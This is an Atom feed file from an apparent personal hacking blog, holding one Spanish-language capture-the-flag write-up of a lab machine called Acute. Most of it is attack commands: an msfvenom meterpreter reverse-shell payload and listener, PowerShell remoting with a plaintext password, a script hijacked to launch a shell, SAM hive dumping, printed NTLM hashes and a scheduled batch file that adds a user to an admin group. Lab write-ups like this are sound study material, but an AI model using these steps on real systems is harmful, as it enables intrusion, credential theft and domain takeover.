@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed/machines.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-06-21T14:38:13-06:00</updated><id>http://localhost:4000/feed/machines.xml</id><title type="html">Armando Villalobos | Machines</title><subtitle>Esto es una página de prueba de hacking
+</subtitle><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><entry><title type="html">Acute</title><link href="http://localhost:4000/machines/machine.html" rel="alternate" type="text/html" title="Acute" /><published>2024-06-20T00:00:00-06:00</published><updated>2024-06-20T00:00:00-06:00</updated><id>http://localhost:4000/machines/machine</id><content type="html" xml:base="http://localhost:4000/machines/machine.html"><![CDATA[<p>Lo más relevante de esta máquina fue</p>
+
+<p>pudimos usar <code class="language-plaintext highlighter-rouge">exiftools</code> para poder ver los metadatos del archivo encontrado en la web</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>exiftools document.docx
+</code></pre></div></div>
+
+<p>Ganamos acceso a la máquina y usamos metaexploit para poder user <code class="language-plaintext highlighter-rouge">screenshare</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/x64/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.8 <span class="nv">LPORT</span><span class="o">=</span>443 <span class="nt">-f</span> exe <span class="nt">-o</span> msf.exe
+
+<span class="o">[</span>msf]<span class="o">(</span>Jobs:0 Agents:0<span class="o">)</span> <span class="o">&gt;&gt;</span> use exploit/multi/handler
+<span class="nb">set </span>payload windows/x64/meterpreter_reverse_tcp
+<span class="nb">set </span>LHOST 10.10.10.10
+<span class="nb">set </span>LPORT 443
+
+</code></pre></div></div>
+
+<p>Tenemos una constraseñas del usuari imonk, procedemos a utilizar pscredentials</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$passwd</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'W3_4R3_th3_f0rce'</span> <span class="nt">-AsPlaintext</span> <span class="nt">-Force</span>
+<span class="nv">$cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'acute\imonks'</span>,<span class="nv">$passwd</span><span class="o">)</span>
+Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">whoami</span><span class="o">}</span>
+</code></pre></div></div>
+
+<p>Obteniendo un script que podemos manipular, podemos modificarlo para entablarnos una reverse shell, utilizamos el mismo que teníamos en la carpeta Utils.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{((</span>Get-Content C:<span class="se">\U</span>sers<span class="se">\i</span>monks<span class="se">\D</span>esktop<span class="se">\w</span>m.ps1 <span class="nt">-Raw</span><span class="o">)</span> 
+<span class="nt">-Replace</span> <span class="s1">'Get-Volume'</span>,<span class="s1">'cmd.exe /c C:\Utils\shell.exe'</span><span class="o">)</span> | Set-Content <span class="nt">-Path</span> C:<span class="se">\U</span>sers<span class="se">\i</span>monks<span class="se">\D</span>esktop<span class="se">\w</span>m.ps1<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Ganamos acceso como otro usuario, podemos hacer lo siguiente ya que está dentro del grupo administradores, podemos intentar obtener los hashes de los usuarios con 
+<code class="language-plaintext highlighter-rouge">secretsdump</code></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg save HKLM<span class="se">\S</span>AM sam.backup
+reg save HKLM<span class="se">\S</span>YSTEM system.backup
+</code></pre></div></div>
+
+<p>Incluso con metasploit podremos obtener los hashes y podemos intentar crackearlos para obtener la contraseña.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
+</code></pre></div></div>
+
+<p>Con la contraseña podemos tener acceso a otro usuario por lo que revisando la máquina, vemos que hay un archivo en program files
+que indica que cada 5 min ejecuta el archivo .bat, con Set-Content podemos crearnos un arcbivo asignando a nuestro usuario al grupo de domain_admins, utilizamos Siteadmin porque según la desripción
+este grupo tiene los privilegios del grupo domain admins.</p>
+
+<p><img src="/assets/img/blog/Acute1.jpg" alt="imagen1" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span><span class="nb">type </span>C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\k</span>eepmeon.bat<span class="o">}</span>
+Invoke-Command <span class="nt">-ComputerName</span> ATSSERVER <span class="nt">-ConfigurationName</span> dc_manage <span class="nt">-Credential</span> <span class="nv">$cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span>Set-Content C:<span class="se">\P</span>ROGRA~1<span class="se">\k</span>eepmeon<span class="se">\p</span>wned.bat <span class="nt">-Value</span> <span class="s1">'net group Site_Admin awallace /domain /add'</span><span class="o">}</span>
+</code></pre></div></div>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="machines" /><summary type="html"><![CDATA[Lo más relevante de esta máquina fue]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/blog/acutepng.png" /><media:content medium="image" url="http://localhost:4000/assets/img/blog/acutepng.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
